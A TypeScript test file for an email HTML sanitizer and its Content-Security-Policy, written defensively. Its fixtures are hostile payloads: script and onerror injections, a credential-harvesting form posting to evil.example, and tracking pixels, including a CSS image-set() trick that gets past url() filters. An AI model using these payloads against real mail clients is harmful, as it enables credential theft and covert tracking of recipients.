/**
 * Hostile email fixtures.
 *
 * The threat model: an attacker sends you an email. If its HTML can run script
 * in the console's origin, it reads the session token straight out of
 * localStorage. So each of these is a payload someone would actually send.
 */
import { describe, expect, it } from "vitest";

import { emailDocument, framePolicy, sanitizeEmailHtml } from "./email-html";

const BLOCKED = false;
const ALLOWED = true;

describe("sanitizeEmailHtml", () => {
  it("drops script tags", () => {
    const { html } = sanitizeEmailHtml("<p>hi</p><script>steal()</script>", BLOCKED);
    expect(html).not.toContain("script");
    expect(html).toContain("hi");
  });

  it("drops inline event handlers", () => {
    const { html } = sanitizeEmailHtml('<img src="x" onerror="steal()">', BLOCKED);
    expect(html).not.toContain("onerror");
  });

  it("drops forms, so a phishing login can't render inside the console", () => {
    const { html } = sanitizeEmailHtml(
      '<form action="https://evil.example/harvest"><input name="password"></form>',
      BLOCKED,
    );
    expect(html).not.toContain("<form");
    expect(html).not.toContain("<input");
  });

  it("forces links out to a new tab with no referrer", () => {
    const { html } = sanitizeEmailHtml('<a href="https://example.com">x</a>', BLOCKED);
    expect(html).toContain('target="_blank"');
    expect(html).toContain('rel="noopener noreferrer"');
  });

  it("strips remote image sources until the reader opts in", () => {
    const payload = '<img src="https://tracker.example/open/abc123.gif">';
    expect(sanitizeEmailHtml(payload, BLOCKED).html).not.toContain("tracker.example");
    expect(sanitizeEmailHtml(payload, BLOCKED).blocked).toBe(true);
    expect(sanitizeEmailHtml(payload, ALLOWED).html).toContain("tracker.example");
  });

  it("catches a tracking pixel hidden in image-set(), not just url()", () => {
    // The bypass this whole layer exists for. A /url\(/ check sees nothing here,
    // but CSS treats the bare string inside image-set() as a URL and the browser
    // fetches it — so the sender learns you opened the mail.
    const payload =
      '<div style=\'background-image:image-set("https://tracker.example/open/abc" 1x)\'>hi</div>';
    const { html, blocked } = sanitizeEmailHtml(payload, BLOCKED);
    expect(html).not.toContain("tracker.example");
    expect(blocked).toBe(true);
  });
});

describe("framePolicy", () => {
  it("permits no remote images by default", () => {
    expect(framePolicy(BLOCKED)).toContain("img-src data:");
    expect(framePolicy(BLOCKED)).not.toContain("https:");
  });

  it("permits https images only once the reader opts in", () => {
    expect(framePolicy(ALLOWED)).toContain("img-src data: https:");
  });

  it("forbids everything it hasn't explicitly allowed", () => {
    const policy = framePolicy(ALLOWED);
    expect(policy).toContain("default-src 'none'"); // no scripts, fetches, frames
    expect(policy).toContain("form-action 'none'"); // belt to DOMPurify's braces
    expect(policy).toContain("base-uri 'none'");
  });
});

describe("emailDocument", () => {
  it("carries its policy in the document, so the browser enforces it", () => {
    const doc = emailDocument("<p>hi</p>", BLOCKED);
    expect(doc).toContain('http-equiv="Content-Security-Policy"');
    expect(doc).toContain("img-src data:");
  });

  it("blocks the image-set payload at the CSP layer even if the regex misses", () => {
    // Belt and braces: pretend the sanitizer let it through. `default-src 'none'`
    // plus `img-src data:` still refuses the fetch — no regex involved.
    const doc = emailDocument(
      '<div style=\'background-image:image-set("https://tracker.example/x" 1x)\'></div>',
      BLOCKED,
    );
    expect(doc).toContain("img-src data:");
    expect(doc).not.toContain("img-src data: https:");
  });
});
